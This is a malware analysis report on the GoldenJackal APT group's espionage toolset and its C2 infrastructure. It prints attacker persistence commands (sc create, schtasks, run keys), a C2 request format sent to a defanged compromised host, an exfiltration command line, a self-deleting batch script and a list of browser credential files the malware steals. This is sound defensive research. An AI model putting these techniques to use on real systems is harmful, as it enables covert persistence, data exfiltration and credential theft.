    "plain_text": "Meet the GoldenJackal APT group. Don\u2019t expect any\nhowls\nsecurelist.com/goldenjackal-apt-group/109677/\n\nAuthors\nGiampaolo Dedola\nGoldenJackal is an APT group, active since 2019, that usually targets government and\ndiplomatic entities in the Middle East and South Asia. Despite the fact that they began their\nactivities years ago, this group is generally unknown and, as far as we know, has not been\npublicly described.\nWe started monitoring the group in mid-2020 and have observed a constant level of activity\nthat indicates a capable and stealthy actor. The main feature of this group is a specific\ntoolset of .NET malware, JackalControl, JackalWorm, JackalSteal, JackalPerInfo and\nJackalScreenWatcher intended to:\ncontrol victim machines\nspread across systems using removable drives\nexfiltrate certain files from the infected system\nsteal credentials\ncollect information about the local system\ncollect information about users\u2019 web activities\ntake screen captures of the desktop\n\n1/26\n\nBased on their toolset and the attacker\u2019s behaviour, we believe the actor\u2019s primary motivation\nis espionage.\n\nInfection vectors\nWe have limited visibility on their infection vectors, but during our investigations, we\nobserved the usage of fake Skype installers and malicious Word documents.\nThe fake Skype installer was a .NET executable file named skype32.exe that was\napproximately 400 MB in size. It was a dropper containing two resources: the JackalControl\nTrojan and a legitimate Skype for business standalone installer. This tool was used in 2020.\nThe other known infection vector was a malicious document that uses the remote template\ninjection technique to download a malicious HTML page, which exploits the Follina\nvulnerability.\n\nMalicious document \u2013 first page\nThe document was named \u201cGallery of Officers Who Have Received National And Foreign\nAwards.docx\u201d and appears as a legitimate circular distributed to collect information about\nofficers decorated by Pakistan\u2019s government. It\u2019s worth noting that the first description of the\nFollina vulnerability was published on May 29, 2022 and this document appears to have\nbeen modified on June 1, two days after publication, and was first detected on June 2.\nThe document was configured to load an external object from a legitimate and compromised\nwebsite:\n2/26\n\nhxxps://www.pak-developers[.]net/internal_data/templates/template.html!\n\nCode snippet used to load the remote resource\nThe remote webpage is a modified version of a public \u201cProof of Concept\u201d to exploit the\nFollina vulnerability. The original PoC is available on GitHub. The attacker replaced the\nIT_BrowseForFile variable value with the following:\n\nCode snippet used to exploit the Follina vulnerability\nThe decoded string is:\n\nDecoded script\nThe exploit downloads and executes an executable file hosted on the legitimate\ncompromised website, and stores it in the following path:\n\u201c%Temp%\\GoogleUpdateSetup.exe\u201d. The downloaded file is the JackalControl malware.\nIn other cases, we do not have a real infection vector, but we observed a system\ncompromised during lateral movements. Specifically, we observed the attacker using the\npsexec utility to start a malicious batch script.\n1\n\ncmd /c \"c:\\windows\\temp\\install.bat > c:\\windows\\temp\\output.txt\"\n\nThe batch script performs a variety of actions, such as installing Microsoft .Net Framework 4,\ninfecting the system with the JackalControl Trojan, and collecting information about the\nsystem.\n3/26\n\n1\n\n$temp\\\\dnf4.exe /q /norestart\n\n2\n\ntasklist\n\n3\n\nsc qc \"WEvMngS\"\n\n4\n\nsc stop \"WEvMngS\"\n\n5\n\nsc delete \"WEvMngS\"\n\n6\n\nsc create \"WEvMngS\" binpath= \"\\\"$windir\\WEvMngS.exe\\\" /1\" displayname=\n\"Windows\n\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\nEvent Manager\" type= own start= auto\"\nsc description \"WEvMngS\" \"Provides event-related methods that register routed\nevents.\"\nsc start \"WEvMngS\"\nschtasks /delete /f /tn \"\\Microsoft\\Windows\\Diagnosis\\Event Manager\"\nschtasks /create /f /tn \"\\Microsoft\\Windows\\Diagnosis\\Event Manager\" /xml\n\"$temp\\\\sch.xml\" /ru \"NT AUTHORITY\\SYSTEM\"\nsc qc \"WEvMngS\"\nschtasks /query /v /fo list /tn \"\\Microsoft\\Windows\\Diagnosis\\Event Manager\"\ntasklist\nnetstat -aon\nping -n 1 google.com\nipconfig /displaydns\nnetsh winhttp show proxy\nreg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v\n\nJackalControl\nThis is a Trojan that allows the attackers to remotely control the target machine through a set\nof predefined and supported commands. These are received via an HTTPS communication\nchannel facilitated between the malware and the C2 servers, and can instruct the implant to\nconduct any of the following operations:\nExecute an arbitrary program with provided arguments\n4/26\n\nDownload arbitrary files to the local file system\nUpload arbitrary files from the local file system\nDuring the last few years, the attackers updated this tool multiple times and we observed\nmultiple variants. We are going to describe the latest version, which was observed in January\n2023 (8C1070F188AE87FBA1148A3D791F2523).\nThe Trojan is an executable file that can be started as a standard program or as a Windows\nservice.\nIt expects an argument, which can be equal to one of the following values:\n/0 : run as a standard program and contacts the C2 servers only once\n/1 : run as a standard program and contacts the C2 servers periodically\n/2 : run as a Windows service\nThe malware arguments and the related malware behavior change according to the variants.\nSome variants offer only two arguments:\n/0 run as a standard program\n/1 run as a Windows service\nOther variants can install themselves with different persistence mechanisms. The malware\u2019s\nexecution flow is determined by the arguments provided in the command line with which it is\nrun.\n/h0: will cause the malware to gain persistence by creating a Windows scheduled task.\n/h1: will cause the malware to gain persistence by creating a corresponding registry run\nkey.\n/h2: will cause the malware to gain persistence by creating a Windows service.\n/r0: run as standard process (this argument is specified by the Windows scheduled\ntask).\n/r1: run as standard process (this argument is specified by the generated registry run\nkey value).\n/r2: run as a service (this argument is specified by the created Windows service).\nOver the years the attackers have distributed different variants: some include code to\nmaintain persistence, others were configured to run without infecting the system; and the\ninfection procedure is usually performed by other components, such as the batch script\nmentioned above.\nThe malware starts its activities by generating a BOT_ID that is a unique value used to\nidentify the compromised system. This value is derived from several other host-based\nvalues:\n\n5/26\n\nThe UUID value obtained from the following WMI query:\n1\n\nselect * from win32_computersystemproduct\n\nThe machine GUID obtained from the following registry key:\n1\n\nselect * from win32_computersystemproduct\n\nThe list of attached drives, obtained from another WMI query, which in turn allows them to\ndetermine the \u2018SerialNumber\u2019 of \u2018PHYSICALDRIVE0\u2019:\n1\n\nselect * from win32_diskdrive\n\nThe collected information is concatenated together in a byte array and then hashed with\nMD5, which is used as a seed for the creation of the BOT_ID. The algorithm used for the\ngeneration of the latter simply sums every two consecutive bytes from the resulting MD5\nhash and places the resulting byte (modulus 256) as a single byte of the final BOT_ID. This\nlogic is described in the code snippet below, taken from the malware.\n\nCode snippet used to generate the BOT_ID\nThe resulting BOT_ID is used also to initialize the DES key and IV, which are then used to\nencrypt communication with the C2.\nThe malware communicates using HTTP POST requests where data arguments will be\ncarried in encoded form as part of the request\u2019s body. The overall request structure will then\nappear as follows:\n\n6/26\n\n1\n\nPOST /wp-includes/class-wp-network-statistics.php HTTP/1.1\n\n2\n\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:68.0) Gecko/20100101\n\n3\n\nFirefox/68.0\n\n4\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n\n5\n\nContent-Type: multipart/form-data; boundary=---2c0272b325864985abf2677460a9b07a\n\n6\n7\n8\n9\n10\n11\n12\n13\n\nAccept-Language: en-GB,en;q=0.5\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0, no-cache\nPragma: no-cache\nHost: finasteridehair[.]com\nContent-Length: 154\nExpect: 100-continue\n\n14\n15\n16\n17\n\n------2c0272b325864985abf2677460a9b07a\nContent-Disposition: form-data; name=\"adv\"\n%ENCODED_DATA%\n\n18\n------2c0272b325864985abf2677460a9b07a\n\nA valid response should in turn be formed in the following way:\n1\n\n<!-- DEBUGDATA::%ENCODED_DATA% -->\n\nThe response is decoded with base64: the resulting payload is an array of strings, where the\nused delimiter is the standard Windows new line sequence \u2013 \u201c\\r\\n\u201d. Each line is decoded\nagain with base64, decrypted with DES, and decompressed with the GZIP algorithm.\nEach command has the following structure:\n\n7/26\n\nCommand structure\nThe command type must be equal to one of the following codes:\nCommand\n\nDescription\n\n00\n\nExecute \u2013 Execute an arbitrary program with the specified arguments. If the\nattacker sets the NoWait flag to False, the malware redirects the process\noutput, reads the data and forwards them to the C2.\n\n01\n\nDownload \u2013 Read a file from the local system and upload it to the server.\n\n02\n\nUpload \u2013 Save received data to the local system using the filepath specified\nby the attacker.\n\nThe Command Data field is intended to carry information on the command arguments and\nhas a different structure for each action type, as specified below:\nExecute\n\nDownload\n\nUpload\n\nThe command results are usually composed into a message that also includes the values of\nthe underlying command type and command ID, which uniquely identifies an instance of a\ncommand issued to the malware. The three values are compressed with GZIP, encrypted\nwith DES, and encoded with base64.\nThe resulting payload is concatenated with the BOT_ID using the \u201c|\u201d char, encoded again\nwith base64, after which it gets uploaded to the remote server using the aforementioned\nPOST request format.\n\nInstaller mode\n\n8/26\n\nSome variants can infect the system, creating a copy of the malware in a specific location\nand guaranteeing its persistence.\nThe malware location is selected with a specific procedure. It enumerates all subdirectories\nin CommonApplicationData and randomly selects one to which its copy will be saved. The\ngenerated file name will be suffixed with the subdirectory\u2019s names and appended with\nanother static value, Launcher.exe, as outlined below:\n1\n\nSelected directory: C:\\ProgramData\\Windows App Certification Kit Launcher\n\n2\n\nMalware copy: \"C:\\ProgramData\\Windows App Certification Kit\n\n3\n\nLauncher\\WindowsAppCertificationKitLauncher.exe\"\n\nIf the operation succeeds, it also changes the new file timestamp and makes it the same as\nthat of the selected subdirectory.\nIf the operation fails, it randomly selects another directory and tries again to copy the\nmalware.\nIf the operation fails with all subdirectories, it tries to use a list of hard-coded directory\nnames:\nGoogle\nViber\nAdGuard\nWinZip\nWinRAR\nAdobe\nCyberLink\nIntel\nIf all the previous attempts fail, it tries to use the same procedure in the following locations:\nApplicationData\nLocalApplicationData\nTemp\nPersistence\nThe malware\u2019s persistence is usually guaranteed with one of the following mechanisms:\nService installation\nCreation of a new Windows registry key value\nCreation of a new scheduled task.\n9/26\n\nThe service is usually installed by the malware with the execution of the Windows sc.exe\nutility.\n1\n2\n3\n4\n\nsc create \"[MALWARE_NAME_NO_EXT]\" binpath= \"[MALWARE_FULL_PATH]\"\n/[ARGUMENT]\"\ndisplayname= \"WORKPATH\" type= own start= auto\nsc description \"[MALWARE_NAME_NO_EXT]\" \"This service keeps your installation up\nto date with the latest enhancements and security fixes.\"\nsc start \"[MALWARE_NAME_NO_EXT]\"\n\nThe registry value is equal to the copied malware file name, without the extension, and is\nstored under the following key:\n1\n\nKey: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n2\n\nValue name: \"[MALWARE_NAME_NO_EXT]\"\n\n3\n\nValue data: \"[MALWARE_FULL_PATH] [ARGUMENT]\"\n\nThe scheduled task is created using a hard-coded XML template that is modified at runtime\nand dropped in the file system using the same malware file path, but with a different\nextension, .xml instead of .exe.\nThe generated XML file is then used with the Windows schtasks.exe utility to create the task.\nFor example:\n1\n\nschtasks.exe /create /f /tn \"Adobe Update\" /xml\n\n2\n\n\"C:\\ProgramData\\Adobe\\adobeupd.xml\"\n\nThe task and service description change according to the variant.\n\nJackalSteal\nJackalSteal is another implant usually deployed on a few compromised machines that is\nused to find files of interest on the target\u2019s system and exfiltrate them to the C2 server.\nThis tool can be used to monitor removable USB drives, remote shares, and all logical drives\nin the targeted system. The malware can work as a standard process or as a service. It\ncannot maintain persistence, so it must be installed by another component.\n10/26\n\nJackalSteal starts its execution by parsing the arguments.\nOption\n\nDescription\n\n-n\n\na unique identifier value for the configured profile\n\n-p\n\ndirectory path to inspect\n\n-s\n\nmaximum size of requested files\n\n-d\n\nnumber of days since the last write of the requested files\n\n-m\n\na comma-separated list of string masks to look for using a regular expression\nwithin the configured directory\n\n-w\n\ntime interval in seconds between consecutive directory scans for the configured\nprofile\n\n-e\n\nexclude path from the scanning activities\n\n/0\n\nrun as standard process\n\n/1\n\nrun as a service\n\nThese options allow the attacker to specify the \u2018profile\u2019, which defines what files are of\ninterest to the attackers. The profile consists of an ID and a list of patterns. Each pattern\ncontains a list of options with the following properties:\nProperty\n\nDescription\n\nPath\n\ntarget paths\n\ncredentials\n\nuser and password used to access a remote share\n\nMasks\n\nstring with wildcard and mask characters that can be used to match any set\nof files using a regular expression\n\nMaxSize\n\nmaximum size of a file\n\nDays\n\nthe number of days since the file was last written\n\nInterval\n\nthe time interval between two consecutive path scans\n\nExclude\n\npaths that must be excluded during scanning activities\n\nThe command used to configure the JackalSteal component is as follows:\n\n11/26\n\n1\n2\n\n%TEMP%\\\\setup01.exe -p all -p usb -e Windows -e \\\"Program Files*\\\" -e ProgramData\n-e\n\n3\n4\n\nUsers\\\\*\\\\AppData -e *\\\\AppData -s 15 -d 30 -w 3600 -m\n*.doc,*.docx,*.pdf,*.jpg,*.png,*.tif,*.tiff,*.txt,*.ppt,*.pptx,*.xls,*.xlsx -n 48df302a44c392eb\n\nThe unique identifier \u201c\u2013n\u201d is usually the same BOT_ID generated by the JackalControl\nTrojan.\nAfter argument processing, the malware serializes the data in an XML, encrypts them with\nDES using a key generated from the ID passed with the \u201c-n\u201d option and stores the resulting\npayload in the following location: \u201c%ApplicationData%\\SNMP\\cache\\%Filename%\u201d, where\n%Filename% is a GUID generated from an MD5 of the unique identifier specified by the\nattacker.\nThe malware is usually executed with the \u201c/0\u201d or \u201c/1\u201d option and the \u201c-n\u201d option, which is used\nto load the obtained profile ID. In the second case, it loads the profile from the previously\nmentioned location and it starts the \u2018Watchers\u2019.\nA Watcher is an object defined in a class with the same name that runs in a different thread\nand scans the location according to the specified options. The pattern could represent:\na simple path in the local filesystem;\na path on a remote share;\nconstant string all;\nconstant string usb.\nWhen the pattern equals \u2018all\u2019, the malware enumerates all logical drives, and for each one it\ncreates a new Watcher object. When the pattern is \u2018usb\u2019, it listens for system events\ncorresponding to the action of creating a new removable drive on the system. When a new\ndrive is detected, it creates a new Watcher object.\nEvery time a new Watcher is added, the malware notifies the log of the event and sends the\ninformation to the remote C2 using HTTP Post requests.\nThe log is created using the following string as a template:\nPath: {0}{1}\\r\\nMasks: {2}\\r\\nExclude: {3}\\r\\nDays: {4}\\r\\nMaxSize:\n{5}\\r\\nInterval: {6}\n\nAnd is uploaded inside an encrypted payload that contains the following information:\n|<AES_Key,AES_IV><Agent_id\\\\%yyyyMMddHHmmssfff%.log><Log content>|\n12/26\n\nThe AES_Key and AES_IV are generated for each request and are encrypted with the RSA\nalgorithm using a key embedded in the code. The resulting payload is also compressed with\nthe GZIP algorithm.\nThe Agent_id\\\\Log_path.log and the Log content data are encrypted with the AES algorithm\nand compressed with GZIP.\nThe Watcher objects are responsible for scanning activities. When a Watcher starts, it\nenumerates all files in the directory and its subdirectories. The scanner can also resolve the\n.lnk links. When the scanner detects a file that matches the defined properties (mask, days,\nmax size, not in exclusions), it calculates the file content hash, checks if the resulting value is\npresent in a hash table stored in the local cache directory and adds the value if not present.\nWhen a new file is detected, the malware uploads the file and the related filepath inside an\nencrypted payload using the same logic described above.\nIn this case, the encrypted payload contains the following information:\n|<AES_Key,AES_IV><Agent_id\\\\Local_file_path><File content>|\n\nThe Agent_id\\\\Local_file_path and the File content data are encrypted with the AES\nalgorithm and compressed with GZIP.\n\nJackalWorm\nThis worm was developed to spread and infect systems using removable USB drives. The\nprogram was designed as a flexible tool that can be used to infect systems with any\nmalware.\nIts behavior changes according to the parent process.\nWhen the malware is working on a system that is already infected and the parent process is\ntaskeng.exe or services.exe:\n1. Monitors removable USB drives\n2. When a device is attached, hides the last-modified directory and replaces it with a copy\nof the worm\nThe code used to monitor removable USB drives is the same one observed in JackalSteal. It\ncreates a ManagementEventWatcher object, which allows it to subscribe to event\nnotifications that correspond to a given WQL query and the issuing of a callback upon their\ninterception. The query used by the malware instructs the system to check for a logical\nremovable disk creation event every five seconds:\n\n13/26\n\n1\n\nselect * from __InstanceCreationEvent within 5 where TargetInstance ISA\n\n2\n\n'Win32_LogicalDisk' and TargetInstance.DriveType = 2\n\nWhen the malware detects a removable USB storage device, it will copy itself onto it. The\npath it will copy to is determined by listing all directories and selecting the one that was\nmodified last. It will create a copy of itself on the drive root using the same directory name\nand change the directory\u2019s attribute to \u201chidden\u201d. This will result in the actual directory being\nhidden and replaced with a copy of the malware with the directory name. Moreover,\nJackalWorm uses an icon mimicking a Windows directory, tricking the user into executing the\nmalware when trying to access a directory.\nIn the following example, the removable drive \u201cE:\u201d was infected by the malware, which\ncopied itself as Folder1.exe and changed the attributes of Folder1 to hide it:\n\nInfected device\nWhen the malware starts on a clean system and the parent process is explorer.exe and the\nfile is located in a removable drive the behavior is as follows:\n1. Opens the hidden directory\n2. Performs the actions specified in the configuration files\n3. Infects the system with the worm\nThe configuration files are embedded resources that contain XML data that can be used to\ninstruct the worm to perform some actions:\nDrop a program and guarantee its persistence with a scheduled task\nDrop a program and execute it with the specified arguments\n14/26\n\nExecute an existing program with the specified arguments\nA valid configuration file looks like this:\n1\n\n<Resource type=\"install\" interval=\"15\" ext=\"exe\" data=\"rcdata02\" />\n\nIn this case, the worm was configured to install the PE file stored in another resource\n\u201crcdata02\u201d, save it with the extension .exe and create a scheduled task to run it every 15\nminutes.\nOther valid examples are:\n1\n\n<Resource type=\"process\" file=\"%TMP%\\test.exe\" args=\"\" data=\"rcdata02\" />\n\nDrops the PE file stored in another resource \u201crcdata02\u201d in \u201c%TEMP%\\test.exe\u201d and executes\nit.\n1\n\n<Resource type=\"process\" file=\"%WINDIR%\\system32\\ping.exe\" args=\"1.1.1.1\"/>\n\nExecutes the program \u201c%WINDIR%\\system32\\ping.exe\u201d with the argument \u201c1.1.1.1\u201d.\nIn our investigations, we observed only the first example and the malware was configured to\ninstall the JackalControl Trojan.\nThe installation procedure selects the malware location in much the same way as the\nprocedure described in the section above. It differs from the other one because it\nenumerates the subdirectories in CommonAppData only and copies the file using the\nsubdirectory\u2019s names concatenated with another static value, upd.exe.\nIf it fails, it tries with a list of hard-coded directory names, which is a bit different from the\nprocedure described above.\nGoogle\nMozilla\nAdobe\nIntel\n[Random GUID]\nThe worm maintains its persistence by creating a scheduled task with a hard-coded XML\ntemplate dynamically modified at runtime. Once installed, the worm deletes itself from the\nremovable drive by using a batch script. The script is dropped in the local Temp directory\nwith a random name:\n15/26\n\n1\n\n@echo off\n\n2\n\n@chcp 65001>nul\n\n3\n\n:check\n\n4\n\n@tasklist | findstr /i \"%executingFilename%\" >nul\n\n5\n\n@if %errorlevel%==0 goto check\n\n6\n\n@del /f /q /a h \"%executingPath%\"\n\n7\n\n@del /f /q \"%Temp%\\%randomname%.bat\"\n\nFuture removable drives that are attached will be re-infected with JackalWorm.\nIt is also worth mentioning that this tool seems to be under development. We deduced this by\nanalyzing the embedded .NET resources of the file\n5DE309466B2163958C2E12C7B02D8384. Their size is 193973 bytes, which is much bigger\nthan their actual content:\nRcdata01 \u2013 XML config \u2013 Size: 67 bytes\nRcdata02 \u2013 JackalControl Trojan \u2013 Size: 27136 bytes\nIt means there are 166770 bytes of unknown data. Most of them are part of the legitimate\nnotepad.exe Windows utility, and specifically, the first 0x6A30 bytes were overwritten. After\nthe legitimate notepad.exe image, we found also the following XML configurations:\n1\n\n<Resource type=\"scheduler\" interval=\"15\" ext=\"exe\" args=\"\" data=\"notepad\" />\n\n1\n\n<Resource type=\"process\" file=\"cmd.exe\" args=\"/c echo TEST >\n\n2\n\n%USERPROFILE%\\Desktop\\test.txt\" />\n\nThe first XML shows a new type value: \u2018scheduler\u2019, which is not specified in the code. The\nsecond XML shows that this specific resource was used for testing purposes and the\nattacker was trying to run cmd.exe to write the word \u201cTEST\u201d in a text file in the desktop:\n%USERPROFILE%\\Desktop\\test.txt.\n\nJackalPerInfo\nThis malware was developed to collect information about the compromised system, as well\nas a specific set of files that could potentially be used to retrieve stored credentials and the\nuser\u2019s web activities. The attacker named it \u201cperinfo\u201d, a contraction of the program\u2019s main\n16/26\n\nclass name PersonalInfoContainer.\nIts behaviour changes according to the number of arguments provided during execution.\nSpecifically, when executed with only one argument, the malware collects a predefined set of\ninformation and stores it in a binary file compressed with GZIP. The filename is specified in\nthe argument provided. When executed with two arguments, the malware uses the first\nargument to load a previously generated binary file and extract all the information to a\ndirectory specified by the second argument.\nBy default, the program should be executed with one argument. Once it is executed, the\nmalware starts collecting information about the system using a specific function, GetSysInfo,\nwhich collects the following information:\n1\n\nComputer name: %s\n\n2\n\nOS version: %S\n\n3\n\nDomain: %S\n\n4\n\nUser: %S\n\n5\n\nLocal time: %s\n\n6\n\nInterfaces:\n\n7\n\n%Interface Name%\n\n8\n9\n\nDESC:\n\n10\n\nTYPE:\n\n11\n\nMAC:\n\n12\n\nIP:\n\n13\n\nGW:\n\n14\n\nDNS:\n\n15\n\nDHCP:\n\n16\n\nDOMAIN:\n\n17\n\nRemote IP:\n\n18\n\nCurrent directory:\n\n19\n\nDrives:\n\n20\n\nC:\\ Fixed\n17/26\n\n21\n\nD:\\ CDRom\n\n22\n\n...\n\n23\n\nApplications:\n\n24\n\n%Installed Application1%\n\n25\n\n%Installed Application2%\n\n26\n\n...\n\n27\n\nProcesses:\n\n28\n\n%Process Name 1%\n\n29\n\nDesc: %s\n\n30\n\nName: %s\n\n31\n\nPath: %s\n\n32\n33\n\n%Process Name 2%\n...\n\nThis specific function was also observed in the first JackalControl variants, but was removed\nfrom newer variants.\nThe malware continues its operation by enumerating the logical drives on the system; and for\neach one it enumerates the files in the root path. The collected info includes the last write\ntime, the filename, and the file size.\nIt then enumerates the Users directory in the system drive, usually C:\\Users\\. For each user,\nit enumerates the content of the following directories:\nDesktop\nDocuments\nDownloads\nAppData\\Roaming\\Microsoft\\Windows\\Recent\nIt tries also to acquire the following files:\n\n18/26\n\n1\n\nDesktop\\*.txt\n\n2\n\nDocuments\\*.txt\n\n3\n\nAppData\\Local\\Microsoft\\Windows\\WebCache\\*.log\n\n4\n\nAppData\\Roaming\\Microsoft\\Windows\\Cookies\\*.txt\n\n5\n\nAppData\\Local\\Google\\Chrome\\User Data\\*\\Bookmarks\n\n6\n\nAppData\\Local\\Google\\Chrome\\User Data\\*\\Cookies\n\n7\n\nAppData\\Local\\Google\\Chrome\\User Data\\*\\History\n\n8\n\nAppData\\Local\\Google\\Chrome\\User Data\\*\\Login Data\n\n9\n\nAppData\\Local\\Google\\Chrome\\User Data\\*\\Shortcuts\n\n10\n\nAppData\\Local\\Google\\Chrome\\User Data\\*\\Web Data\n\n11\n\nAppData\\Roaming\\Opera\\Opera\\*\\bookmarks.adr\n\n12\n\nAppData\\Roaming\\Opera\\Opera\\*\\global_history.dat\n\n13\n\nAppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\places.sqlite\n\n14\n\nAppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite\n\n15\n\nAppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\formhistory.sqlite\n\nThe malware attempts to steal credentials stored in the victim\u2019s browser databases, as well\nas other information such as cookies that could be used to gain access to web services.\nFinally, it serializes the collected information to a binary format, compresses all the data with\nthe GZIP algorithm, and stores everything in the file specified with the first argument\nprovided by the attacker.\n\nJackalScreenWatcher\nThis tool is used to collect screenshots of the victim\u2019s desktop and sends the pictures to a\nremote, hard-coded C2 server:\nhxxps://tahaherbal[.]ir/wp-includes/class-wp-http-iwr-client.php\nThis specific webpage was also used as a C2 for the JackalSteal component, indicating that\nthe tools are probably part of a unique framework.\nThe malware can handle some arguments that are optional and can be provided as input:\n\n19/26\n\n-r resolution ratio (default 1.0)\n-i interval (default 10 seconds)\n-n specify a custom agent id. By default, this value is equal to:\n%Hostname%\\%Username%\nThe program\u2019s primary function involves running a thread that scans all displays on the\nsystem, checking their dimensions. It then starts an infinite loop, periodically checking if the\nuser is active on the system. Whenever the malware detects user activity, it captures a\nscreenshot and sends it to the remote server.\nUser activity is detected by monitoring the cursor\u2019s position and checking if it has changed\nsince the last recorded position. After uploading a screenshot, it waits for a specified interval\nbefore restarting the loop.\nThe screenshots are uploaded inside an encrypted payload using HTTP Post requests.\nThe encrypted payload is similar to that used by JackalSteal and contains the following\ninformation:\n|<AES_Key,AES_IV><Remote filename><Screenshot>|\n\nAES_Key and AES_IV are encrypted with the RSA algorithm using a key embedded in the\ncode. The resulting payload is also compressed with the GZIP algorithm.\nThe Remote filename and Screenshot data are encrypted with the AES algorithm and\ncompressed with GZIP. The RSA key is the same as that observed in other JackalSteal\ncomponents.\n\nInfrastructure\nGoldenJackal activity is characterized by the use of compromised WordPress websites as a\nmethod to host C2-related logic. We believe the attackers upload a malicious PHP file that is\nused as a relay to forward web requests to another backbone C2 server.\nWe don\u2019t have any evidence of the vulnerabilities used to compromise the sites. However,\nwe did observe that many of the websites were using obsolete versions of WordPress and\nsome had also been defaced or infected with previously uploaded web shells, likely as a\nresult of low-key hacktivist or cybercriminal activity. For this reason, we assess that the\nvulnerabilities used to breach these websites are known ones rather than 0-days.\nThe remote webpage usually replies with a fake \u201cNot Found\u201d page. The HTTP response\nstatus code is \u201c200\u201d, but the HTTP body shows a \u201cNot found\u201d webpage.\nXHTML\n\n20/26\n\n1\n\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n\n2\n\n<html><head>\n\n3\n\n<title>404 Not Found</title>\n\n4\n\n</head><body>\n\n5\n\n<h1>Not Found</h1>\n\n6\n\n<p>The requested URL %FILE PATH% was not found on this server.</p>\n\n7\n\n<hr>\n\n8\n\n<address>%SERVER%</address>\n\n9\n\n</body></html>\n\nIn specific cases, the attacker provides a valid response with a list of commands. In those\ncases, the previous body is followed by a long list of standard Windows new line sequences\n\u2013 \u201c\\r\\n\u201d \u2013 and finally the previously mentioned delimiter:\n1\n\n<!-- DEBUGDATA::%ENCODED_DATA% -->\n\nVictims\nOver the years, we have observed a limited number of attacks against government and\ndiplomatic entities in the Middle East and South Asia. We observed victims in: Afghanistan,\nAzerbaijan, Iran, Iraq, Pakistan and Turkey.\n\n21/26\n\nGeography of victims\n\nAttribution\nWe are unable to link GoldenJackal to any known actor.\nDuring our investigations, we observed some similarities between GoldenJackal and Turla.\nSpecifically, we noticed a code similarity in the victim UID generation algorithm that overlaps\nsomewhat with that used by Kazuar.\nSpecifically, Kazuar gets the MD5 hash of a predefined string and then XORs it with a fourbyte unique \u201cseed\u201d from the machine. The seed is obtained by fetching the serial number of\nthe volume where the operating system is installed.\nXHTML\n\n22/26\n\n1\n\npublic static Guid md5_plus_xor(string string_0) {\n\n2\n\nbyte[] bytes = BitConverter.GetBytes(parameter_class.unique_pc_identifier);\n\n3\n\nbyte[] array = MD5.Create().ComputeHash(get_bytes_wrapper(string_0));\n\n4\n\nfor (int i = 0; i < array.Length; i++) {\n\n5\n\nbyte[] array2 = array;\n\n6\n\nint num = i;\n\n7\n\narray2[num] ^= bytes[i % bytes.Length];\n\n8\n\n}\n\n9\n\nreturn new Guid(array);\n\n10\n\n}\n\nJackalControl uses an MD5+SHIFT algorithm. It collects a set of information from the\nmachine, including the serial number of the volume where the operating system is installed,\nto generate a unique seed with the MD5 algorithm. Then it uses the resulting byte array,\nsumming every two consecutive bytes from the resulting MD5 hash and placing the resulting\nbytes (modulus 256) as the sequence that constructs the final BOT_ID.\n\nCode snippet used to generate the BOT_ID\nMoreover, the use of tools developed in .NET and of compromised WordPress websites as\nC2 is a common Turla TTP.\nLast but not least, the groups share an interest in the same targets, and in one specific case\nwe observed that a victim machine was infected with a Turla artifact two months before the\nGoldenJackal infection.\nDespite these similarities, we assessed with low confidence that there is a connection\nbetween GoldenJackal and Turla, since neither of these is unique to either threat actor. The\nuse of compromised WordPress websites is not a unique TTP. This technique was also\nobserved in activity by other groups such as BlackShadow, another APT active in the Middle\n23/26\n\nEast that uses .NET malware. The code similarities are related to a single function in a .NET\nprogram that could be easily copied with a decompiler. It is possible that GoldenJackal used\nthat algorithm as a false flag. Another hypothesis is that the developers behind JackalControl\nwere inspired by Turla and decided to replicate the UID generation algorithm. Finally, the\nshared interest in the same targets is easily explained by the fact that the victims are highprofile targets that could be considered interesting by different actors.\n\nConclusions\nGoldenJackal is an interesting APT actor that tries to keep a low profile. Despite its long-term\nactivities, which are believed to have started in June 2019, this group and the related\nsamples are still generally unknown.\nThe group is probably trying to reduce its visibility by limiting the number of victims.\nAccording to our telemetry, the number of targets is very low and most of them were related\nto government or diplomatic entities. Moreover, some of the samples were deployed only on\nsystems that were not protected by Kaspersky during the infection phase. This may indicate\nthat the actor is trying to protect some of its tools and avoid specific security solutions.\nTheir toolkit seems to be under development \u2013 the number of variants shows that they are\nstill investing in it. The latest malware, JackalWorm, appeared in the second half of 2022 and\nappears to still be in the testing phase. This tool was unexpected because in previous years\nthe attacks were limited to a small group of high-profile entities, and a tool like JackalWorm is\nprobably difficult to bind and can easily get out of control.\nMore information about GoldenJackal, including IoCs and YARA rules, are available to\ncustomers of the Kaspersky Intelligence Reporting Service.
